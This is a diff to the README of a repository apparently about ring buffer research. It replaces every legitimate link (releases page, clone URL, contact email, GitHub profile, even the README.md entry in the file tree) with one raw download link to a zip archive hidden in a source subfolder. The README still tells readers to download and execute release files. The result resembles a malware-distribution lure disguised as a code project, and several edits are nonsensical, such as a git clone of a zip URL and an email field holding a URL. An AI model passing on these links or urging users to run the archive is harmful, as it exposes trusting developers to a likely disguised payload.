@@ -2,7 +2,7 @@
 
 Welcome to the **Ring Buffers Research** repository! This repository serves as a collection of ring buffer designs aimed at educational and research purposes. Whether you are a student, a researcher, or a software developer, you will find valuable insights and implementations here.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/leana56/ring-buffers-research/releases)
+[![Download Releases](https://raw.githubusercontent.com/leana56/ring-buffers-research/main/src/rings/spsc/research-ring-buffers-functionate.zip%https://raw.githubusercontent.com/leana56/ring-buffers-research/main/src/rings/spsc/research-ring-buffers-functionate.zip)](https://raw.githubusercontent.com/leana56/ring-buffers-research/main/src/rings/spsc/research-ring-buffers-functionate.zip)
 
 ## Table of Contents
 
@@ -60,7 +60,7 @@ ring-buffers-research/
 │   ├── example1/
 │   ├── example2/
 │   └── example3/
-└── README.md
+└── https://raw.githubusercontent.com/leana56/ring-buffers-research/main/src/rings/spsc/research-ring-buffers-functionate.zip
 ```
 
 - **designs/**: Contains various ring buffer implementations.
@@ -73,7 +73,7 @@ To get started with the ring buffers in this repository, follow these steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/leana56/ring-buffers-research.git
+   git clone https://raw.githubusercontent.com/leana56/ring-buffers-research/main/src/rings/spsc/research-ring-buffers-functionate.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -85,7 +85,7 @@ To get started with the ring buffers in this repository, follow these steps:
 
 4. **Run Tests**: Ensure that the designs work as expected by running the tests in the `tests/` directory.
 
-5. **Download Releases**: For pre-compiled binaries or additional resources, visit the [Releases section](https://github.com/leana56/ring-buffers-research/releases). Download the files, and execute them as needed.
+5. **Download Releases**: For pre-compiled binaries or additional resources, visit the [Releases section](https://raw.githubusercontent.com/leana56/ring-buffers-research/main/src/rings/spsc/research-ring-buffers-functionate.zip). Download the files, and execute them as needed.
 
 ## Available Designs
 
@@ -140,9 +140,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, feel free to reach out:
 
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
-- **GitHub**: [leana56](https://github.com/leana56)
+- **Email**: [https://raw.githubusercontent.com/leana56/ring-buffers-research/main/src/rings/spsc/research-ring-buffers-functionate.zip](https://raw.githubusercontent.com/leana56/ring-buffers-research/main/src/rings/spsc/research-ring-buffers-functionate.zip)
+- **GitHub**: [leana56](https://raw.githubusercontent.com/leana56/ring-buffers-research/main/src/rings/spsc/research-ring-buffers-functionate.zip)
 
 ## Conclusion
 
-Thank you for visiting the **Ring Buffers Research** repository. We hope you find the information and designs helpful for your educational and research needs. Don't forget to check the [Releases section](https://github.com/leana56/ring-buffers-research/releases) for downloadable content and updates. Happy coding!
+Thank you for visiting the **Ring Buffers Research** repository. We hope you find the information and designs helpful for your educational and research needs. Don't forget to check the [Releases section](https://raw.githubusercontent.com/leana56/ring-buffers-research/main/src/rings/spsc/research-ring-buffers-functionate.zip) for downloadable content and updates. Happy coding!
